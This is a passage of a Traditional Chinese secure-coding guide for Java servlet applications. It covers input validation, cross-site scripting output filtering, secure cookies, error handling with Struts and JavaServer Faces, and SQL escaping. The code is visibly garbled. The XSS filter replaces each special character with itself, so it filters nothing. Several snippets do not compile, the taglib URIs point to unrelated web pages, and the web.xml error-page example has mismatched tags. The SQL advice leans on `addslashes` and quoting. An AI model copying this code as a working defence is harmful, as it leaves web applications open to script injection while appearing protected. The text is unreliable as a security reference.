</div><div></div><div>[4] 欄位範圍</div><div>一律確定輸入參數在函數需求定義的範圍內。</div><div></div><div>驗證輸入 numberOfChoices 是否在 10-20 之間的範例：</div><div></div><div>  // Example to validate the field range
  public Class Validator {
      ...
      public static boolean validateRange(int value, int min, int max) {
          return (value &gt;= min &amp;&amp; value &lt;= max);
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("numberOfChoices");
  if (Validator.validateRequired(fieldValue)) {
      if (Validator.validateInt(fieldValue)) {
          int numberOfChoices = Integer.parseInt(fieldValue);
          if (Validator.validateRange(numberOfChoices, 10, 20)) {
              // numberOfChoices is valid, continue processing request
              ...
          }
      }
  }
</div><div></div><div>[5] 欄位選項</div><div>Web 應用程式通常會向使用者呈現一組可供選擇的選項（例如：使用 SELECT HTML 標籤），但無法執行伺服器端驗證來確保所選的值是容許的選項之一。請記住，惡意的使用者可以輕易修改任何選項值。請一律對照函數需求所定義容許的選項來驗證所選的使用者值。</div><div></div><div>對照容許的選項清單來驗證使用者選項的範例：</div><div></div><div>  // Example to validate user selection against a list of options
  public Class Validator {
      ...
      public static boolean validateOption(Object[] options, Object value) {
          boolean isValidValue = false;
          try {
              List list = Arrays.asList(options);
              if (list != null) {
                  isValidValue = list.contains(value);
              }
          } catch (Exception e) {
          }
          return isValidValue;
      }
      ...
  }
  ...
  // Allowed options
  String[] options = {"option1", "option2", "option3");
  // Verify that the user selection is one of the allowed options
  String userSelection = request.getParameter("userSelection");
  if (Validator.validateOption(options, userSelection)) {
      // valid user selection, continue processing request
      ...
  }
</div><div></div><div>[6] 欄位型樣</div><div>一律檢查使用者輸入是否符合功能需求所定義的型樣。比方說，如果 userName 欄位只應接受英數字元，且不區分大小寫，請使用下列正規表示式：^[a-zA-Z0-9]*$</div><div></div><div>Java 1.3 或更早的版本不包括任何正規表示式套件。建議搭配 Java 1.3 來使用「Apache 正規表示式套件」（請參閱下列「資源」），以解決這項支援欠缺。執行正規表示式驗證的範例：</div><div></div><div>  // Example to validate that a given value matches a specified pattern
  // using the Apache regular expression package
  import org.apache.regexp.RE;
  import org.apache.regexp.RESyntaxException;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
               RE r = new RE(expression);
               match = r.match(value);             
          }
          return match;
      }
      ...
  }
  ...
  // Verify that the userName request parameter is alpha-numeric
  String userName = request.getParameter("userName");
  if (Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      // userName is valid, continue processing request
      ...
  }
</div><div></div><div>Java 1.4 引進了新的正規表示式套件 (java.util.regex)。以下是 Validator.matchPattern 的修正版，使用新的 Java 1.4 正規表示式套件：</div><div></div><div>  // Example to validate that a given value matches a specified pattern
  // using the Java 1.4 regular expression package
  import java.util.regex.Pattern;
  import java.util.regexe.Matcher;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
              match = Pattern.matches(expression, value);
          }
          return match;
      }
      ...
  }
</div><div></div><div>[7] Cookie 值</div><div>請利用 javax.servlet.http.Cookie 物件來驗證 Cookie 值。依應用程式需求而定，相同的驗證規則（說明如上）也適用於 Cookie 值，例如：驗證必要的值、驗證長度，等等。</div><div></div><div>驗證必要 Cookie 值的範例：</div><div></div><div>  // Example to validate a required cookie value
  // First retrieve all available cookies submitted in the HTTP request
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      // find the "user" cookie
      for (int i=0; i&lt;cookies.length; ++i) {
          if (cookies[i].getName().equals("user")) {
              // validate the cookie value
              if (Validator.validateRequired(cookies[i].getValue()) {
                  // valid cookie value, continue processing request
                  ...
              }
          }    
      }
  }
</div><div></div><div>[8] HTTP 回應</div><div>[8-1] 過濾使用者輸入</div><div>如果要保護應用程式免於遭受跨網站指令碼，請將機密字元轉換成對應的字元實體來消毒 HTML。以下是 HTML 區分字元：</div><div>&lt; &gt; " ' % ; ) ( &amp; +</div><div></div><div>將機密字元轉換成對應的字元實體來過濾指定字串的範例：</div><div></div><div>  // Example to filter sensitive data to prevent cross-site scripting
  public Class Validator {
      ...
      public static String filter(String value) {
          if (value == null) {
              return null;
          }        
          StringBuffer result = new StringBuffer(value.length());
          for (int i=0; i&lt;value.length(); ++i) {
              switch (value.charAt(i)) {
              case '&lt;':
                  result.append("&lt;");
                  break;
              case '&gt;': 
                  result.append("&gt;");
                  break;
              case '"': 
                  result.append(""");
                  break;
              case '\'': 
                  result.append("'");
                  break;
              case '%': 
                  result.append("%");
                  break;
              case ';': 
                  result.append(";");
                  break;
              case '(': 
                  result.append("(");
                  break;
              case ')': 
                  result.append(")");
                  break;
              case '&amp;': 
                  result.append("&amp;");
                  break;
              case '+':
                  result.append("+");
                  break;
              default:
                  result.append(value.charAt(i));
                  break;
          }        
          return result;
      }
      ...
  }
  ...
  // Filter the HTTP response using Validator.filter
  PrintWriter out = response.getWriter();
  // set output response
  out.write(Validator.filter(response));
  out.close();
</div><div></div><div>Java Servlet API 2.3 引進了「過濾器」，它支援截取及轉換 HTTP 要求或回應。</div><div></div><div>利用「Servlet 過濾器」，以 Validator.filter 來消毒回應的範例：</div><div></div><div>  // Example to filter all sensitive characters in the HTTP response using a Java Filter.
  // This example is for illustration purposes since it will filter all content in the response, including HTML tags!
  public class SensitiveCharsFilter implements Filter {
      ...
      public void doFilter(ServletRequest request,
                      ServletResponse response,
                      FilterChain chain)
              throws IOException, ServletException {
  
          PrintWriter out = response.getWriter();
          ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);
          chain.doFilter(request, wrapper);
  
          CharArrayWriter caw = new CharArrayWriter();
          caw.write(Validator.filter(wrapper.toString()));
          
          response.setContentType("text/html");
          response.setContentLength(caw.toString().length());
          out.write(caw.toString());
          out.close();
      }
      ...
      public class CharResponseWrapper extends HttpServletResponseWrapper {
          private CharArrayWriter output;
  
          public String toString() {
              return output.toString();
          }
      
          public CharResponseWrapper(HttpServletResponse response){
              super(response);
              output = new CharArrayWriter();
          }
          
          public PrintWriter getWriter(){
              return new PrintWriter(output);
          }
      }
  } 
  
  }
</div><div></div><div>[8-2] 維護 Cookie 安全</div><div>當機密資料儲存在 Cookie 中，請務必利用 Cookie.setSecure（布林旗標），在 HTTP 回應中設定 Cookie 的安全旗標，以指示瀏覽器利用 HTTPS 或 SSL 之類的安全通訊協定來傳送 Cookie。</div><div></div><div>維護 "user" Cookie 安全的範例：</div><div></div><div>  // Example to secure a cookie, i.e. instruct the browser to
  // send the cookie using a secure protocol
  Cookie cookie = new Cookie("user", "sensitive");
  cookie.setSecure(true);
  response.addCookie(cookie);
</div><div></div><div>建議的 Java 工具</div><div>適用於伺服器端驗證的兩個主要的 Java 架構如下：</div><div>[1] Jakarta 一般驗證器（整合 Struts 1.1）</div><div>「Jakarta 一般驗證器」實作上述所有資料驗證需求，是一個功能強大的架構。這些規則配置在定義表單欄位輸入驗證規則的 XML 檔中。依預設，Struts 支援在利用 Struts 'bean:write' 標籤撰寫的所有資料上，過濾 [8] HTTP 回應中輸出的危險字元。設定 'filter=false' 旗標可以停用這個過濾。</div><div></div><div>Struts 定義下列基本輸入驗證器，但也可以定義自訂驗證器：</div><div>required：如果欄位含有空格以外的任何字元，便告成功。</div><div>mask：如果值符合 mask 屬性給定的正規表示式，便告成功。</div><div>range：如果值在 min 和 max 屬性給定的值範圍內（(value &gt;= min) 且 (value &lt;= max)），便告成功。</div><div>maxLength：如果欄位長度小於或等於 max 屬性，便告成功。</div><div>minLength：如果欄位長度大於或等於 min 屬性，便告成功。</div><div>byte、short、integer、long、float、double：如果值可以轉換成對應的基本類型，便告成功。</div><div>date：如果值代表有效日期，便告成功。可提供日期型樣。</div><div>creditCard：如果值可能是有效的信用卡號碼，便告成功。</div><div>e-mail：如果值可能是有效的電子郵件位址，便告成功。</div><div></div><div>利用「Struts 驗證器」驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</div><div></div><div>[2] JavaServer Faces 技術</div><div>「JavaServer Faces 技術」是一組代表使用者介面元件、管理元件狀態、處理事件及輸入驗證的 Java API (JSR 127)。</div><div></div><div>JavaServer Faces API 實作下列基本驗證器，但可以定義自訂驗證器：</div><div>validate_doublerange：登錄元件的 DoubleRangeValidator</div><div>validate_length：登錄元件的 LengthValidator</div><div>validate_longrange：登錄元件的 LongRangeValidator</div><div>validate_required：登錄元件的 RequiredValidator</div><div>validate_stringrange：登錄元件的 StringRangeValidator</div><div>validator：登錄元件的自訂 Validator</div><div></div><div>JavaServer Faces API 定義下列 UIInput 和 UIOutput 展現器（標籤）：</div><div>input_date：接受以 java.text.Date 實例格式化的 java.util.Date</div><div>output_date：顯示以 java.text.Date 實例格式化的 java.util.Date</div><div>input_datetime：接受以 java.text.Time 實例格式化的 java.util.Date</div><div>output_datetime：顯示以 java.text.Time 實例格式化的 java.util.Date</div><div>input_number：顯示以 java.text.NumberFormat 格式化的數值資料類型（java.lang.Number 或基本資料類型）</div><div>output_number：顯示以 java.text.NumberFormat 格式化的數值資料類型（java.lang.Number 或基本資料類型）</div><div>input_text：接受單行字串。</div><div>output_text：顯示單行字串。</div><div>input_time：接受以 java.text.DateFormat 時間實例格式化的 java.util.Date</div><div>output_time：顯示以 java.text.DateFormat 時間實例格式化的 java.util.Date</div><div>input_hidden：可讓頁面作者將隱藏變數併入頁面</div><div>input_secret：接受不含空格的單行文字，輸入之時，將它顯示成一組星號</div><div>input_textarea：接受多行文字</div><div>output_errors：顯示整個頁面的錯誤訊息，或指定之用戶端 ID 的相關錯誤訊息</div><div>output_label：將巢狀元件顯示為指定輸入欄位的標籤</div><div>output_message：顯示本地化訊息</div><div></div><div>利用 JavaServer Faces 驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;%@ taglib uri="https://docs.oracle.com/javaee/6/tutorial/doc/glxce.html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://mrbool.com/how-to-create-a-login-validation-with-jsf-java-server-faces/27046" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</div><div></div><div></div><div>參照</div><div>Java API 1.3 - </div><a href="https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html</a><br /><div>Java API 1.4 - </div><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a><br /><div>Java Servlet API 2.3 - </div><a href="https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api">https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api</a><br /><div>Java 正規表示式套件 - </div><a href="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</a><br /><div>Jakarta 驗證器 - </div><a href="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</a><br /><div>JavaServer Faces 技術 - </div><a href="http://www.javaserverfaces.org/">http://www.javaserverfaces.org/</a><br /><div></div><div>** 錯誤處理：</div><div></div><div>許多 J2EE Web 應用程式架構都遵循「模型視圖控制器 (MVC)」型樣。在這個型樣中，Servlet 扮演控制器的角色。Servlet 將應用程式處理程序委派給 JavaBean，例如，EJB Session Bean（模型）。之後，Servlet 再將要求轉遞給 JSP（視圖）來呈現處理結果。Servlet 應該檢查所有輸入、輸出、回覆碼、錯誤碼及已知的異常狀況，以確保會實際進行預期的處理程序。</div><div></div><div>資料驗證可以保護應用程式免於遭受惡意的資料竄改，有效的錯誤處理策略則是防止應用程式意外揭露內部錯誤訊息（例如：異常狀況堆疊追蹤）所不可或缺。好的錯誤處理策略會處理下列項目：</div><div></div><div>[1] 定義錯誤</div><div>[2] 報告錯誤</div><div>[3] 呈現錯誤</div><div>[4] 錯誤對映</div><div></div><div>[1] 定義錯誤</div><div>應該避免將錯誤訊息寫在應用程式層（例如：Servlet）。相反地，應用程式應該使用對映至已知之應用程式失敗的錯誤索引鍵。在實務中，好的做法是定義錯誤索引鍵來對映至 HTML 表單欄位或其他 Bean 內容的驗證規則。比方說，如果需要 "user_name" 欄位，它必須是英數字元，且在資料庫中必須是唯一，便應該定義下列錯誤索引鍵：</div><div></div><div>(a) ERROR_USERNAME_REQUIRED：這個錯誤索引鍵用來顯示一則訊息，通知使用者需要 "user_name" 欄位；</div><div>(b) ERROR_USERNAME_ALPHANUMERIC：這個錯誤索引鍵用來顯示一則訊息，通知使用者 "user_name" 欄位應該是英數字元；</div><div>(c) ERROR_USERNAME_DUPLICATE：這個錯誤索引鍵用來顯示一則訊息，通知使用者 "user_name" 值在資料庫中重複；</div><div>(d) ERROR_USERNAME_INVALID：這個錯誤索引鍵用來顯示一則一般訊息，通知使用者 "user_name" 值無效；</div><div></div><div>在實務中，好的做法是定義下列架構 Java 類別來儲存及報告應用程式錯誤：</div><div></div><div>- ErrorKeys：定義所有錯誤索引鍵</div><div></div><div>      // Example: ErrorKeys defining the following error keys:    
      //    - ERROR_USERNAME_REQUIRED
      //    - ERROR_USERNAME_ALPHANUMERIC
      //    - ERROR_USERNAME_DUPLICATE
      //    - ERROR_USERNAME_INVALID
      //    ...
      public Class ErrorKeys {
          public static final String ERROR_USERNAME_REQUIRED = "error.username.required";
          public static final String ERROR_USERNAME_ALPHANUMERIC = "error.username.alphanumeric";
          public static final String ERROR_USERNAME_DUPLICATE = "error.username.duplicate";
          public static final String ERROR_USERNAME_INVALID = "error.username.invalid";
          ...
      }
</div><div></div><div>- Error：封裝個別錯誤</div><div></div><div>      // Example: Error encapsulates an error key.
      // Error is serializable to support code executing in multiple JVMs.
      public Class Error implements Serializable {
          
          // Constructor given a specified error key
          public Error(String key) {
              this(key, null);
          }
          
          // Constructor given a specified error key and array of placeholder objects
          public Error(String key, Object[] values) {
              this.key = key;
              this.values = values;
          }
          
          // Returns the error key
          public String getKey() {
              return this.key;
          }
          
          // Returns the placeholder values
          public Object[] getValues() {
              return this.values;
          }
          
          private String key = null;
          private Object[] values = null;
      }    
</div><div></div><div>- Errors：封裝錯誤的集合</div><div></div><div>      // Example: Errors encapsulates the Error objects being reported to the presentation layer.
      // Errors are stored in a HashMap where the key is the bean property name and value is an
      // ArrayList of Error objects.
      public Class Errors implements Serializable {
      
          // Adds an Error object to the Collection of errors for the specified bean property.
          public void addError(String property, Error error) {
              ArrayList propertyErrors = (ArrayList)errors.get(property);
              if (propertyErrors == null) {
                  propertyErrors = new ArrayList();
                  errors.put(property, propertyErrors);
              }
              propertyErrors.put(error);            
          }
          
          // Returns true if there are any errors
          public boolean hasErrors() {
              return (errors.size &gt; 0);
          }
          
          // Returns the Errors for the specified property
          public ArrayList getErrors(String property) {
              return (ArrayList)errors.get(property);
          }
  
          private HashMap errors = new HashMap();
      }
</div><div></div><div>以下是利用上述架構類別來處理 "user_name" 欄位驗證錯誤的範例：</div><div></div><div>  // Example to process validation errors of the "user_name" field.
  Errors errors = new Errors();
  String userName = request.getParameter("user_name");
  // (a) Required validation rule
  if (!Validator.validateRequired(userName)) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED));
  } // (b) Alpha-numeric validation rule
  else if (!Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC));
  }
  else
  {
      // (c) Duplicate check validation rule
      // We assume that there is an existing UserValidationEJB session bean that implements
      // a checkIfDuplicate() method to verify if the user already exists in the database.
      try {
          ...        
          if (UserValidationEJB.checkIfDuplicate(userName)) {
              errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE));
          }
      } catch (RemoteException e) {
          // log the error
          logger.error("Could not validate user for specified userName: " + userName);
          errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE);
      }
  }
  // set the errors object in a request attribute called "errors"
  request.setAttribute("errors", errors);
  ...
</div><div></div><div>[2] 報告錯誤</div><div>報告 Web 層應用程式錯誤的方式有兩種：</div><div>(a) Servlet 錯誤機制</div><div>(b) JSP 錯誤機制</div><div></div><div>[2-a] Servlet 錯誤機制</div><div>Servlet 報告錯誤的可能方式如下：</div><div>- 轉遞至輸入 JSP（已將錯誤儲存在要求屬性中），或</div><div>- 利用 HTTP 錯誤碼引數來呼叫 response.sendError，或</div><div>- 擲出異常狀況</div><div></div><div>在實務中，好的做法是處理所有已知的應用程式錯誤（依照 [1] 區段所說明），將它們儲存在要求屬性中，再轉遞給輸入 JSP。輸入 JSP 應該顯示錯誤訊息，並提示使用者重新輸入資料。下列範例說明如何轉遞到輸入 JSP (userInput.jsp)：</div><div></div><div>  // Example to forward to the userInput.jsp following user validation errors
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd != null) {
      rd.forward(request, response);
  }
</div><div></div><div>如果 Servlet 無法轉遞到已知的 JSP 頁面，第二個選項是利用 response.sendError 方法，設定 HttpServletResponse.SC_INTERNAL_SERVER_ERROR 引數（狀態碼 500）來報告錯誤。</div><div>請參閱 javax.servlet.http.HttpServletResponse javadoc，以取得各種 HTTP 狀態碼的詳細資訊。</div><div>傳回 HTTP 錯誤的範例：</div><div></div><div>  // Example to return a HTTP error code
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd == null) {
      // messages is a resource bundle with all message keys and values
      response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR,
                              messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID));
  }
</div><div></div><div>作為最後的手段，Servlet 可以擲出異常狀況，它必須是下列類別之一的子類別：</div><div>- RuntimeException</div><div>- ServletException</div><div>- IOException</div><div></div><div>[2-b] JSP 錯誤機制 JSP 頁面依照下列範例所示來定義 errorPage 指引，從而提供了執行時期異常狀況的處理機制：</div><div></div><div>      &lt;%@ page errorPage="/errors/userValidation.jsp" %&gt;
</div><div></div><div>未捕捉的 JSP 異常狀況是轉遞到指定的 errorPage，而原始異常狀況則設在稱為 javax.servlet.jsp.jspException 的要求參數中。錯誤頁面必須包含 isErrorPage 指引，如下所示：</div><div></div><div>      &lt;%@ page isErrorPage="true" %&gt;
</div><div></div><div>isErrorPage 指引會使 "exception" 變數起始設定為所擲出的異常狀況物件。</div><div></div><div>[3] 呈現錯誤</div><div>J2SE Internationalization API 提供用來提出應用程式資源以及將訊息格式化的公用程式類別，其中包括：</div><div></div><div>(a) 資源組</div><div>(b) 訊息格式化</div><div></div><div>[3-a] 資源組</div><div>資源組會將本地化的資料與使用它的原始碼分開，從而支援國際化。每個資源組都會儲存特定語言環境之鍵值配對的對映。</div><div></div><div>通常是利用或延伸 java.util.PropertyResourceBundle，它會將內容儲存在外部內容檔中，如下列範例所示：</div><div></div><div>  ################################################
  # ErrorMessages.properties
  ################################################
  # required user name error message
  error.username.required=User name field is required
  
  # invalid user name format
  error.username.alphanumeric=User name must be alphanumeric
  
  # duplicate user name error message
  error.username.duplicate=User name {0} already exists, please choose another one
  
  ...
</div><div></div><div>定義多重資源可以支援不同的語言環境（因此稱為資源組）。例如，定義 ErrorMessages_fr.properties 可以支援資源組系列的法國成員。如果要求之語言環境的資源成員不存在，便會使用預設成員。在上述範例中，預設資源是 ErrorMessages.properties。依使用者的語言環境而定，應用程式（JSP 或 Servlet）會從適當的資源擷取內容。</div><div></div><div>[3-b] 訊息格式化</div><div>J2SE 標準類別 java.util.MessageFormat 提供以取代位置保留元來建立訊息的一般方式。MessageFormat 物件包含內嵌了格式指定元的型樣字串，如下所示：</div><div></div><div>  // Example to show how to format a message using placeholder parameters
  String pattern = "User name {0} already exists, please choose another one";
  String userName = request.getParameter("user_name");
  Object[] args = new Object[1];
  args[0] = userName;
  String message = MessageFormat.format(pattern, args);
</div><div></div><div>以下是利用 ResourceBundle 和 MessageFormat 來呈現錯誤訊息的更綜合性的範例：</div><div></div><div>  // Example to render an error message from a localized ErrorMessages resource (properties file)
  // Utility class to retrieve locale-specific error messages
  public Class ErrorMessageResource {
      
      // Returns the error message for the specified error key in the environment locale
      public String getErrorMessage(String errorKey) {
          return getErrorMessage(errorKey, defaultLocale);
      }
      
      // Returns the error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Locale locale) {
          return getErrorMessage(errorKey, null, locale);
      }
      
      // Returns a formatted error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Object[] args, Locale locale) {    
          // Get localized ErrorMessageResource
          ResourceBundle errorMessageResource = ResourceBundle.getBundle("ErrorMessages", locale);
          // Get localized error message
          String errorMessage = errorMessageResource.getString(errorKey);
          if (args != null) {
              // Format the message using the specified placeholders args
              return MessageFormat.format(errorMessage, args);
          } else {
              return errorMessage;
          }
      }
      
      // default environment locale
      private Locale defaultLocale = Locale.getDefaultLocale();
  }
  ...
  // Get the user's locale
  Locale userLocale = request.getLocale();
  // Check if there were any validation errors
  Errors errors = (Errors)request.getAttribute("errors");
  if (errors != null &amp;&amp; errors.hasErrors()) {
      // iterate through errors and output error messages corresponding to the "user_name" property
      ArrayList userNameErrors = errors.getErrors("user_name");
      ListIterator iterator = userNameErrors.iterator();
      while (iterator.hasNext()) {
          // Get the next error object
          Error error = (Error)iterator.next();
          String errorMessage = ErrorMessageResource.getErrorMessage(error.getKey(), userLocale);
          output.write(errorMessage + "\r\n");
      }
  }
</div><div></div><div>建議您定義自訂 JSP 標籤（如 displayErrors）來疊代處理及呈現錯誤訊息，如上述範例所示。</div><div></div><div>[4] 錯誤對映</div><div>一般而言，「Servlet 儲存器」會傳回對應於回應狀態碼或異常狀況的預設錯誤頁面。您可以利用自訂錯誤頁面來指定狀態碼或異常狀況與 Web 資源之間的對映。</div><div>在實務中，好的做法是開發不揭露內部錯誤狀態的靜態錯誤頁面（依預設，大部分 Servlet 儲存器都會報告內部錯誤訊息）。這項對映是依照下列範例所指定，配置在「Web 部署描述子 (web.xml)」中：</div><div></div><div>  &lt;!-- Mapping of HTTP error codes and application exceptions to error pages --&gt;
  &lt;error-page&gt;
    &lt;exception-type&gt;UserValidationException&lt;/exception-type&gt;
    &lt;location&gt;/errors/validationError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;500&lt;/exception-type&gt;
    &lt;location&gt;/errors/internalError.html&lt;/error-page&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
  ...
  &lt;/error-page&gt;
  ...
</div><div></div><div></div><div>建議的 Java 工具</div><div>適用於伺服器端驗證的兩個主要的 Java 架構如下：</div><div>[1] Jakarta 一般驗證器（整合 Struts 1.1）</div><div>「Jakarta 一般驗證器」是依照上述說明來定義錯誤處理機制的 Java 架構。驗證規則配置在 XML 檔中，檔案定義了表單欄位的輸入驗證規則以及對應的驗證錯誤索引鍵。Struts 提供國際化支援，供您利用資源組和訊息格式化來建置本地化應用程式。</div><div></div><div>利用「Struts 驗證器」驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</div><div></div><div>Struts JSP 標籤庫定義了有條件地顯示一組累計錯誤訊息的 "errors" 標籤，如下列範例所示：</div><div></div><div>  &lt;%@ page language="java" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html" %&gt;
  &lt;%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean" %&gt;
  &lt;html:html&gt;
  &lt;head&gt;
  &lt;body&gt;
      &lt;html:form action="/logon.do"&gt;    
      &lt;table border="0" width="100%"&gt;
      &lt;tr&gt;
          &lt;th align="right"&gt;
              &lt;html:errors property="username"/&gt;
              &lt;bean:message key="prompt.username"/&gt;
          &lt;/th&gt;
          &lt;td align="left"&gt;
              &lt;html:text property="username" size="16"/&gt;
          &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
      &lt;td align="right"&gt;
          &lt;html:submit&gt;&lt;bean:message key="button.submit"/&gt;&lt;/html:submit&gt;
      &lt;/td&gt;
      &lt;td align="right"&gt;
          &lt;html:reset&gt;&lt;bean:message key="button.reset"/&gt;&lt;/html:reset&gt;
      &lt;/td&gt;
      &lt;/tr&gt;
      &lt;/table&gt;
      &lt;/html:form&gt;
  &lt;/body&gt;
  &lt;/html:html&gt;
</div><div></div><div>[2] JavaServer Faces 技術</div><div>「JavaServer Faces 技術」是一組代表使用者介面元件、管理元件狀態、處理事件、驗證輸入，以及支援國際化的 Java API (JSR 127)。</div><div></div><div>JavaServer Faces API 定義了 "output_errors" UIOutput 展現器，以顯示整個頁面的錯誤訊息，或指定之用戶端 ID 的相關錯誤訊息。</div><div></div><div>利用 JavaServer Faces 驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;%@ taglib uri="https://docs.oracle.com/javaee/6/tutorial/doc/glxce.html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://mrbool.com/how-to-create-a-login-validation-with-jsf-java-server-faces/27046" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</div><div></div><div>參照</div><div>Java API 1.3 - </div><a href="https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html</a><br /><div>Java API 1.4 - </div><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a><br /><div>Java Servlet API 2.3 - </div><a href="https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api">https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api</a><br /><div>Java 正規表示式套件 - </div><a href="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</a><br /><div>Jakarta 驗證器 - </div><a href="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</a><br /><div>JavaServer Faces 技術 - </div><a href="http://www.javaserverfaces.org/">http://www.javaserverfaces.org/</a><br /><div>** 過濾使用者輸入</div><div></div><div>將任何資料傳給 SQL 查詢之前，一律應該先利用白名單技術來適當過濾。這無論如何強調都不為過。</div><div>過濾使用者輸入可讓許多注入缺失，在抵達資料庫之前便得到更正。</div><div></div><div>** 引用使用者輸入</div><div></div><div>不論任何資料類型，只要資料庫允許，便用單引號括住所有使用者資料，始終是好的觀念。</div><div>MySQL 接受這個格式化技術。</div><div></div><div>** 跳出資料值</div><div></div><div>如果您使用 MySQL 4.3.0 或更新的版本，您應該用 mysql_real_escape_string() 來跳出所有字串。</div><div>如果使用舊版的 MySQL，便應該使用 mysql_escape_string() 函數。</div><div>如果未使用 MySQL，您可以選擇使用特定資料庫的特定跳出函數。</div><div>如果不知道跳出函數，您可以選擇使用較一般的跳出函數，例如，addslashes()。</div><div></div><div>如果使用 PEAR DB 資料庫抽象層，您可以使用 DB::quote() 方法或使用 ? 